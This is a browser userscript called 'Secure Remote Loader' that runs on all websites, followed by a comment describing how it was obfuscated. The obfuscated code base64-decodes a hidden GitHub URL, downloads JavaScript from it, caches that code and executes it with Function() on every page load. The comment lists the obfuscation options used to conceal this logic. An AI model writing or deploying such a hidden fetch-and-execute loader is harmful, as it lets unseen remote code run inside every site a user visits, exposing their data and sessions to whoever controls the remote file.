// ==UserScript==
// @name         🔒 Secure Remote Loader
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Loads obfuscated logic from a remote source
// @author       You
// @match        *://*/*
// @grant        GM_getValue
// @grant        GM_setValue
// ==/UserScript==


(function(){function jso$ft$giden$GM_95setValue(){return GM_setValue}function jso$ft$boe$_33_61_61(a,b){return a!== b}function jso$ft$boe$_61_61(a,b){return a== b}function jso$ft$giden$fetch(){return fetch}function jso$ft$giden$_95_36af_51_50_55_56_54(){return _$af32786}function jso$ft$uoel$_33(a){return !a}function jso$ft$giden$console(){return console}function jso$ft$giden$Function(){return Function}function jso$ft$giden$GM_95getValue(){return GM_getValue}function jso$ft$giden$atob(){return atob}function _$af32786(){var CACHE_KEY={},cachedCode={};jso$spliter_$af32791();const encodedURL="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RhdjU3MC90YW1wZXJtb25rZXktc2NyaXB0LWRhdmlkL3JlZnMvaGVhZHMvbWFpbi9pbmRleC5qcw==";const remoteURL=jso$ft$giden$atob()(encodedURL);CACHE_KEY._= "remote_script_code";;cachedCode._= jso$ft$giden$GM_95getValue()(CACHE_KEY._,null);;if(cachedCode._){try{jso$ft$giden$Function()(cachedCode._)()}catch(err){jso$ft$giden$console().error("Error running cached code:",err)}};if(jso$ft$uoel$_33(_$af32786)){jso$ft$giden$_95_36af_51_50_55_56_54()();jso$spliter_$af32792();return};jso$ft$giden$fetch()(remoteURL).then((res)=>{return res.text()}).then((latestCode)=>{if(jso$ft$boe$_61_61(_$af32786,null)){jso$spliter_$af32793();return};if(jso$ft$boe$_33_61_61(latestCode,cachedCode._)){jso$ft$giden$GM_95setValue()(CACHE_KEY._,latestCode);if(jso$ft$uoel$_33(_$af32786)){return};jso$ft$giden$console().log("\ud83c\udd95 Updated script from remote.")}else {jso$ft$giden$console().log("\u2705 Remote script is up-to-date.")}}).catch((err)=>{jso$ft$giden$console().warn("\u26a0\ufe0f Could not fetch remote script:",err)})}(_$af32786)();function jso$spliter_$af32791(){'use strict'}function jso$spliter_$af32792(){_$af32786= null}function jso$spliter_$af32793(){_$af32786= null}})()



// DO NOT COPY BELOW INTO CLIENT SOURCE!! (CLIENT SSCRIPT OR EDITOR)

/*
OBFUSCATION INSTRUCTION

WEBSITE (Obfuscation Tool):
https://javascriptobfuscator.com/Javascript-Obfuscator.aspx

OPTIONS USED:
✅ Code Transpositon
✅ Dead Code Insertion
✅ Move Members
✅ Flat Transform

VARIABLE EXCLUSION LIST:
GM_getValue,GM_setValue,GM_info,console
*/
